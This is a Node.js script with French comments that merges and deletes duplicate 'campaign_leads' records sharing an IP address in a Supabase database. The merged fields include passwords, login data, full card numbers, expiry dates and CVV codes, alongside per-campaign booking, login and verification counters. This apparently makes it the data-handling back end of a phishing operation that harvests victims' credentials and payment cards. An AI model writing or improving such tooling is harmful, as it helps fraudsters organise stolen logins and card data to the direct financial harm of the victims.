// Script pour nettoyer les doublons de leads ayant la même IP
// Exécuter avec : node cleanup_duplicate_leads.js

import { LeadService, supabaseAdmin } from './lib/supabase.js';

async function cleanupDuplicateLeads() {
  console.log('🧹 Nettoyage des doublons de leads par IP...\n');

  try {
    // Récupérer tous les leads groupés par campagne
    const { data: allLeads, error } = await supabaseAdmin
      .from('campaign_leads')
      .select('*')
      .order('campaign_id, ip_address, created_at');

    if (error) throw error;

    console.log(`📋 ${allLeads.length} leads trouvés au total\n`);

    // Grouper par campagne puis par IP
    const campaignGroups = {};
    
    for (const lead of allLeads) {
      if (!campaignGroups[lead.campaign_id]) {
        campaignGroups[lead.campaign_id] = {};
      }
      
      if (!campaignGroups[lead.campaign_id][lead.ip_address]) {
        campaignGroups[lead.campaign_id][lead.ip_address] = [];
      }
      
      campaignGroups[lead.campaign_id][lead.ip_address].push(lead);
    }

    let totalDuplicatesFound = 0;
    let totalMerged = 0;

    // Traiter chaque campagne
    for (const [campaignId, ipGroups] of Object.entries(campaignGroups)) {
      console.log(`🎯 Traitement de la campagne: ${campaignId}`);
      
      let campaignDuplicates = 0;
      let campaignMerged = 0;

      // Traiter chaque groupe d'IP
      for (const [ipAddress, leads] of Object.entries(ipGroups)) {
        if (leads.length > 1) {
          console.log(`  🔍 IP ${ipAddress}: ${leads.length} leads trouvés`);
          campaignDuplicates += leads.length - 1;
          
          // Fusionner les leads
          const mergedLead = await mergeLeads(campaignId, ipAddress, leads);
          if (mergedLead) {
            campaignMerged++;
            console.log(`    ✅ Leads fusionnés en un seul: ${mergedLead.id}`);
          }
        }
      }

      if (campaignDuplicates > 0) {
        console.log(`  📊 Campagne ${campaignId}: ${campaignDuplicates} doublons trouvés, ${campaignMerged} groupes fusionnés\n`);
      } else {
        console.log(`  ✅ Aucun doublon trouvé pour la campagne ${campaignId}\n`);
      }

      totalDuplicatesFound += campaignDuplicates;
      totalMerged += campaignMerged;
    }

    console.log(`🎉 Nettoyage terminé !`);
    console.log(`📊 Total des doublons trouvés: ${totalDuplicatesFound}`);
    console.log(`🔧 Groupes de leads fusionnés: ${totalMerged}`);

  } catch (error) {
    console.error('❌ Erreur lors du nettoyage:', error);
  }
}

async function mergeLeads(campaignId, ipAddress, leads) {
  try {
    console.log(`    🔄 Fusion de ${leads.length} leads pour IP ${ipAddress}`);
    
    // Trier les leads par date de création (le plus ancien en premier)
    leads.sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
    
    const primaryLead = leads[0]; // Le plus ancien devient le lead principal
    const duplicateLeads = leads.slice(1); // Les autres sont des doublons
    
    console.log(`    📌 Lead principal: ${primaryLead.id} (email: ${primaryLead.email})`);
    
    // Fusionner toutes les données dans le lead principal
    const mergedData = {
      // Prendre l'email le plus récent (non-temporaire si possible)
      email: getBestEmail(leads),
      first_name: getBestValue(leads, 'first_name'),
      last_name: getBestValue(leads, 'last_name'),
      phone: getBestValue(leads, 'phone'),
      description: getBestValue(leads, 'description'),
      
      // Additionner tous les compteurs
      visit_count: leads.reduce((sum, lead) => sum + (lead.visit_count || 0), 0),
      booking_count: leads.reduce((sum, lead) => sum + (lead.booking_count || 0), 0),
      login_count: leads.reduce((sum, lead) => sum + (lead.login_count || 0), 0),
      verification_count: leads.reduce((sum, lead) => sum + (lead.verification_count || 0), 0),
      
      // Prendre les dates les plus récentes
      booking_submitted_at: getLatestDate(leads, 'booking_submitted_at'),
      login_submitted_at: getLatestDate(leads, 'login_submitted_at'),
      verification_submitted_at: getLatestDate(leads, 'verification_submitted_at'),
      
      // Prendre les données les plus complètes
      booking_data: getBestValue(leads, 'booking_data'),
      login_data: getBestValue(leads, 'login_data'),
      password: getBestValue(leads, 'password'),
      card_number: getBestValue(leads, 'card_number'),
      card_name: getBestValue(leads, 'card_name'),
      card_expiry: getBestValue(leads, 'card_expiry'),
      card_cvv: getBestValue(leads, 'card_cvv'),
      selected_plan: getBestValue(leads, 'selected_plan'),
      
      updated_at: new Date().toISOString()
    };

    console.log(`    📊 Données fusionnées: visits=${mergedData.visit_count}, bookings=${mergedData.booking_count}, logins=${mergedData.login_count}, verifications=${mergedData.verification_count}`);

    // Mettre à jour le lead principal avec les données fusionnées
    const { data: updatedLead, error: updateError } = await supabaseAdmin
      .from('campaign_leads')
      .update(mergedData)
      .eq('id', primaryLead.id)
      .select()
      .single();

    if (updateError) throw updateError;

    // Supprimer les doublons
    const duplicateIds = duplicateLeads.map(lead => lead.id);
    console.log(`    🗑️ Suppression de ${duplicateIds.length} doublons: ${duplicateIds.join(', ')}`);
    
    const { error: deleteError } = await supabaseAdmin
      .from('campaign_leads')
      .delete()
      .in('id', duplicateIds);

    if (deleteError) throw deleteError;

    return updatedLead;
    
  } catch (error) {
    console.error(`    ❌ Erreur lors de la fusion des leads pour IP ${ipAddress}:`, error);
    return null;
  }
}

// Choisir le meilleur email (non-temporaire de préférence)
function getBestEmail(leads) {
  // Chercher un email qui n'est pas temporaire
  const realEmail = leads.find(lead => 
    lead.email && 
    !lead.email.includes('visitor_') && 
    !lead.email.includes('@temp.local')
  );
  
  if (realEmail) {
    return realEmail.email;
  }
  
  // Sinon prendre le plus récent
  return leads[leads.length - 1].email;
}

// Choisir la meilleure valeur (non-null et non-vide de préférence)
function getBestValue(leads, field) {
  // Chercher une valeur non-null et non-vide
  const validValue = leads.find(lead => 
    lead[field] !== null && 
    lead[field] !== undefined && 
    lead[field] !== ''
  );
  
  if (validValue) {
    return validValue[field];
  }
  
  // Sinon prendre la valeur du lead le plus récent
  return leads[leads.length - 1][field];
}

// Obtenir la date la plus récente
function getLatestDate(leads, field) {
  const dates = leads
    .map(lead => lead[field])
    .filter(date => date !== null && date !== undefined)
    .map(date => new Date(date))
    .sort((a, b) => b - a); // Tri décroissant
  
  return dates.length > 0 ? dates[0].toISOString() : null;
}

// Fonction pour vérifier les résultats
async function verifyCleanup() {
  console.log('\n🔍 Vérification après nettoyage...\n');

  try {
    const { data: allLeads, error } = await supabaseAdmin
      .from('campaign_leads')
      .select('campaign_id, ip_address')
      .order('campaign_id, ip_address');

    if (error) throw error;

    // Grouper par campagne et IP pour détecter d'éventuels doublons restants
    const ipCounts = {};
    
    for (const lead of allLeads) {
      const key = `${lead.campaign_id}:${lead.ip_address}`;
      ipCounts[key] = (ipCounts[key] || 0) + 1;
    }

    const remainingDuplicates = Object.entries(ipCounts).filter(([key, count]) => count > 1);
    
    if (remainingDuplicates.length === 0) {
      console.log('✅ Aucun doublon détecté après nettoyage');
    } else {
      console.log(`⚠️ ${remainingDuplicates.length} doublons restants détectés:`);
      remainingDuplicates.forEach(([key, count]) => {
        console.log(`  - ${key}: ${count} leads`);
      });
    }

  } catch (error) {
    console.error('❌ Erreur lors de la vérification:', error);
  }
}

// Exécuter le script
if (import.meta.url === `file://${process.argv[1]}`) {
  console.log('🚀 Démarrage du nettoyage des doublons de leads...\n');
  
  await cleanupDuplicateLeads();
  await verifyCleanup();
  
  console.log('\n📋 Nettoyage terminé. Vérifiez les résultats dans votre base de données.');
  process.exit(0);
} 